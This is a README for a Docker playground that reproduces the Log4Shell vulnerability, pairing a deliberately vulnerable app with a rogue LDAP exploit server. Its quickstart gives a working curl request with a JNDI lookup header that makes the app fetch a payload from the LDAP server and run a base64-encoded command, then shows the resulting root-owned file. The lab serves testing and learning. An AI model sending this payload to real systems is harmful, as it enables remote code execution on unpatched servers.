full playground setup for log4shell using [this great app and documentation](https://github.com/christophetd/log4shell-vulnerable-app) ([their blog post](https://www.cynet.com/log4shell/))and [this rogue LDAP server](https://codechina.csdn.net/mirrors/feihong-cs/JNDIExploit.git) (codechina mirror as it was removed from github)

Both projects copied into this repo and original README/LICENSEs kept under each.

## Quickstart

* Launch the *lab*
```
docker compose up
```
* Send payload to *vulnapp`
```
curl 127.0.0.1:40000 -H 'X-Api-Version: ${jndi:ldap://ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
* Verify payload executed
```
docker compose exec vulnapp ls -l /tmp/pwned
-rw-r--r--    1 root     root             0 Dec 14 01:43 /tmp/pwned
```
